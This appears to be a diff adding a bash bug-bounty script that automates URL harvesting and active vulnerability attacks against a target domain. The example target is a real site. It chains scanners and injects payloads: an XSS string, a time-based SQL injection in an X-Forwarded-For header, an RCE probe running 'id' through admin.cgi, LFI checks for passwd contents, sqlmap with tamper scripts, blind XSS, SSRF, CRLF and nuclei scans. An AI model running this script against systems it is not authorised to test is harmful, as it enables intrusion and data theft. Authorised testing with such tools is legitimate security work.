@@ -1,0 +1,136 @@
+#!/bin/bash
+
+if [[ $# -eq 0 ]];
+then
+    echo "Enter domain target "
+    echo "ex: bash ~/script/hunt https://admin.snapp.ir snapp.ir"
+    exit 1
+fi
+
+
+url=$1
+target=$2
+domain=`echo "$url" | unfurl  domains | sed 's/\./_/g' `
+host=`echo "$url" | rev | cut -d "." -f 1,2 | rev`
+
+if [ ! -d "~/recon/$target/$domain" ];then
+        mkdir ~/recon/$target/$domain
+fi
+if [ ! -d "~/recon/$target/$domain/PortScan" ];then
+        mkdir ~/recon/$target/$domain/PortScan
+fi
+if [ ! -d "~/recon/$target/$domain/Vulnerability" ];then
+        mkdir ~/recon/$target/$domain/Vulnerability
+fi
+if [ ! -d "~/recon/$target/$domain/Vulnerability/nuclei" ];then
+        mkdir ~/recon/$target/$domain/Vulnerability/nuclei
+fi
+
+
+
+python3 ~/tools/telify/telify.py -m "Vulnerability Scanning Started"
+echo ""
+
+# echo -e "\e[1;31m [+] Launching rustscan  to check for open ports \e[0m"
+# cat  ~/recon/$url/subdomains/httprobe | unfurl domains | while read sub ;do rustscan $sub --top | grep -E '(^[0-9])' >  ~/recon/$url/PortScan/$sub.txt;done
+# echo ""
+
+echo -e "\e[1;32m[+] Gathering URLs.... ) \e[0m"
+waybackurls $url | uro | tee -a /tmp/way.txt 
+gau $url | uro | tee -a /tmp/gau.txt 
+katana -u $url -o /tmp/katana.txt
+gospider --site $url --other-source --include-other-source --depth 3 --user-agent "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15" --quiet --robots --sitemap --json | grep -v '\[url\]' | jq -r ".output" | grep -Eiv '\.(css|jpg|jpeg|png|svg|img|gif|mp4|flv|ogv|webm|webp |mov|mp3|m4a|m4p| ppt |pptx|scss|tif| tiff |ttf lott |woff|woff2|bmp|ico|eot|htc|swf|rtf|image)' | grep $url | sort -u > /tmp/ggospider.txt
+echo "$url" | hakrawler | tee -a /tmp/hakrawler.txt
+python3 tools/ParamSpider/paramspider.py -d $url --level high  --quiet -o /tmp/params.txt
+cd ~/tools/
+./x8/target/release/x8 -u /tmp/params.txt -m 25 -O url  --reflected-only -w ~/wordlist/parameter/param1 -o /tmp/x8-params
+cat /tmp/way.txt /tmp/gau.txt /tmp/katana.txt /tmp/hakrawler.txt /tmp/ggospider.txt /tmp/x8-params  /tmp/params.txt | sort -u  | grep "$host$" | tee -a ~/recon/$target/$domain/Vulnerability/waybackurls.txt
+rm -rf /tmp/way.txt /tmp/gau.txt /tmp/katana.txt /tmp/hakrawler.txt /tmp/ggospider.txt /tmp/x8-params /tmp/params.txt
+echo ""
+
+echo -e "\e[1;32m[+] Gathering JS Files ) \e[0m"
+waybackurls $url | grep -iE '\.js'| grep -iEv '(\.jsp|\.json)' > /tmp/js1.txt 
+gau $url | grep -iE '\.js'| grep -iEv '(\.jsp|\.json)' > /tmp/js2.txt
+echo "$url" | hakrawler  | grep -iE '\.js' | grep -iEv '(\.jsp|\.json)' > /tmp/js3.txt 
+katana -u $url | grep -iE '\.js' | grep -iEv '(\.jsp|\.json)' > /tmp/js4.txt 
+echo $url  > /tmp/subjs-$domain.txt
+subjs -i  /tmp/subjs-$domain.txt | tee -a /tmp/subjs.txt 
+cat /tmp/js1.txt /tmp/js2.txt /tmp/js3.txt /tmp/js4.txt /tmp/subjs.txt | grep -v "bootstrap.min.js" | grep -Ev  "bootstrap[a-zA-Z0-9_-]+\.js"| grep -v "jquery.min.js" | grep -v "popper.min.js" |grep -v "plugins" | grep -v  "themes" |grep -v "jquery.js"| grep -Ev "jquery[a-zA-Z0-9_-]+"| grep -Ev "jquery.[a-zA-Z0-9_-]+" | grep -v "/wp-includes/" |  tee -a ~/recon/$target/$domain/Vulnerability/js-files.txt
+rm -rf  /tmp/js1.txt /tmp/js2.txt /tmp/js3.txt /tmp/js4.txt /tmp/subjs.txt  /tmp/subjs-$domain.txt
+echo ""
+
+
+
+echo -e "\e[1;32m[+] LFI ) \e[0m"
+cat ~/recon/$target/$domain/Vulnerability/waybackurls.txt | gf lfi  | httpx -path ~/wordlist/files/lfi_wordlist.txt -u $url2/FUZZ -t 10 -mr "root:[x*]:0:0:" -o ~/recon/$target/$domain/Vulnerability/LFI.txt
+echo ""
+
+echo -e "\e[1;32m[+] OPEN Redirec ) \e[0m"
+python3 ~/tools/autoredirect/autoredirect.py -f ~/recon/$target/$domain/Vulnerability/waybackurls.txt -s -n 5 -o ~/recon/$target/$domain/Vulnerability/OPEN_REDIRECT.txt
+echo ""
+
+echo -e "\e[1;32m[+] XSS ) \e[0m"
+cat ~/recon/$target/$domain/Vulnerability/waybackurls.txt | grep -Ev "\.(jpeg|jpg|png|ico)$" | uro | gf xss | Gxss -c 100 -p XssReflected | grep "=" | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | egrep -v 'Not' | anew  ~/recon/$target/$domain/Vulnerability/XSS.txt
+echo""
+
+echo -e "\e[1;32m[+] Blind XSS ) \e[0m"
+cat ~/recon/$target/$domain/Vulnerability/waybackurls.txt | gf xss | sed 's/=.*/=/' | sort -u | tee /tmp/Possible_xss.txt  && cat /tmp/Possible_xss.txt | dalfox -b  ~/wordlist/blindxss pipe >> ~/recon/$target/$domain/Vulnerability/BlinXSS.txt
+echo""
+
+echo -e "\e[1;32m[+] Hidden Dirs  ) \e[0m"
+python3 ~/tools/dirsearch/dirsearch.py -u $url -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,log,xml,js,json --deep-recursive --force-recursive --exclude-sizes=0B --random-agent --full-url -o ~/recon/$target/$domain/Vulnerability/dirsearch.txt
+echo ""
+
+echo -e "\e[1;32m[+] RCE ) \e[0m"
+cat ~/recon/$target/$domain/Vulnerability/waybackurls.txt | httpx -path "/cgi-bin/admin.cgi?Command=sysCommand&Cmd=id" -nc -ports 80,443,8080,8443 -mr "uid=" -silent  -o  ~/recon/$target/$domain/Vulnerability/RCE.txt
+echo ""
+
+
+echo -e "\e[1;32m[+] run JSFScan.sh for scanner js files ) \e[0m"
+bash ~/scripts/JSFScan.sh/JSFScan.sh -l ~/recon/$target/$domain/Vulnerability/waybackurls.txt --all -o ~/recon/$target/$domain/Vulnerability/JSFScan-Results
+echo ""
+
+echo -e "\e[1;32m[+] SQLI ) \e[0m"
+cat ~/recon/$target/$domain/Vulnerability/waybackurls.txt | gf sqli >> /tmp/sqli.txt ; python3 ~/tools/sqlmap-dev/sqlmap.py  -m /tmp/sqli.txt   --batch --tamper=~/tools/sqlmap-dev/tamper/between.py --random-agent --level 3 --risk 2 --output-dir ~/recon/$target/$domain/Vulnerability/SQLI
+rm -rf  /tmp/sqli.txt
+echo ""
+
+echo -e "\e[1;32m[+] SQLI-2 ) \e[0m"
+cat ~/recon/$target/$domain/Vulnerability/waybackurls.txt| httpx -silent -H "X-Forwarded-For: 'XOR(if(now()=sysdate(),sleep(13),0))OR" -rt -timeout 20 -mrt '>13' >>  ~/recon/$target/$domain/Vulnerability/SQLI-Headers
+echo ""
+
+echo -e "\e[1;32m[+] SQLI-3 ) \e[0m"
+userefuzz -l ~/recon/$target/$domain/Vulnerability/waybackurls.txt  -o ~/recon/$target/$domain/Vulnerability/SQLI-Headers-2
+echo ""
+
+
+echo -e "\e[1;32m[+] SQLI-4 ) \e[0m"
+userefuzz -l ~/recon/$target/$domain/Vulnerability/waybackurls.txt -i ~/wordlist/time-base-sql -s 10  -o ~/recon/$target/$domain/Vulnerability/SQLI-Headers-3
+echo ""
+
+echo -e "\e[1;32m[+] SSRF ) \e[0m"
+cat ~/recon/$target/$domain/Vulnerability/waybackurls.txt | gf ssrf | anew /tmp/$domain-ssrf.txt 
+cd /tmp
+python3 ~/tools/autossrf/autossrf.py -f $url-ssrf.txt -o ~/recon/$target/$domain/Vulnerability/SSRF
+cd -
+rm -rf /tmp/$domain-ssrf.txt 
+echo ""
+
+echo -e "\e[1;32m[+] CRlf Injection ) \e[0m"
+cat ~/recon/$target/$domain/Vulnerability/waybackurls.txt | crlfuzz -s | tee  ~/recon/$target/$domain/Vulnerability/CRL
+echo ""
+
+
+echo -e "\e[1;32m[+] Prototype Pollution Scann ) \e[0m"
+cat ~/recon/$target/$domain/Vulnerability/waybackurls.txt | ppmap > ~/recon/$target/$domain/Vulnerability/Prototype
+echo ""
+
+echo -e "\e[1;32m[+] Vulnerability Scanning - Nuclei :) \e[0m"
+nuclei -u $url -severity high -rl 100 -c 10 -o ~/recon/$target/$domain/Vulnerability/nuclei/nuclei_high.txt;
+nuclei -u $url -severity critical -rl 100 -c 10 -o ~/recon/$target/$domain/Vulnerability/nuclei/nuclei_critical.txt;
+nuclei -u $url -tags cves -rl 100 -c 10 -o ~/recon/$target/$domain/Vulnerability/nuclei/nuclei_cves.txt
+echo ""
+
+echo -e "\e[1;32m[+] Recon Stage Completed :) \e[0m"
+python3 ~/tools/telify/telify.py -m "Vulnerability Scanning Completed"
+echo ""
